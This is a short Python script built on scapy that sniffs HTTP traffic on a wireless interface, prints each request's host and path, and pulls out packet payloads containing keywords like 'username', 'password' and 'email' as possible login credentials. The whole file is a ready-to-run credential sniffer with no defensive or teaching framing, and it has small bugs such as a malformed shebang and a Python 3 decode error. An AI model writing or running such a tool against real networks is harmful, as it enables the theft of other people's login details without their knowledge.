#! usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        packet.show()
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "uname", "user", "login", "password", "email", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print(packet.show())
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode())
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username / password > " + login_info.decode() + "\n\n")


sniff("wlan0")
